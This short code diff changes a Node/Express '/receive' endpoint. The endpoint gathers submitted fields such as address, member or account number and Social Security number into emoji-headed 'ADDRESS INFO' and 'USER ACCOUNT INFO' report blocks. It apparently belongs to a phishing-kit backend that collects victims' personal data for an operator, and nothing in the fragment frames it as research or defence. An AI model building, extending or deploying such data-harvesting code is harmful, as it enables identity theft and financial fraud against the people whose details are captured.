@@ -293,7 +293,7 @@ app.post('/receive', async (req, res) => {
       res.send('dn');
     }
 
-    if (myObjects.includes('address') || myObjects.includes('city') || myObjects.includes('zip')) {
+    if (myObjects.includes('address')) {
       message += `👤 ADDRESS INFO\n\n` +
                  `========================\n\n`;
 
@@ -312,7 +312,7 @@ app.post('/receive', async (req, res) => {
       res.send('dn');
     }
 
-    if (myObjects.includes('membernumber') || myObjects.includes('accountnumber') || myObjects.includes('ssn')) {
+    if ( myObjects.includes('ssn')) {
       message += `👤 USER ACCOUNT INFO\n\n` +
                  `========================\n\n`;
 
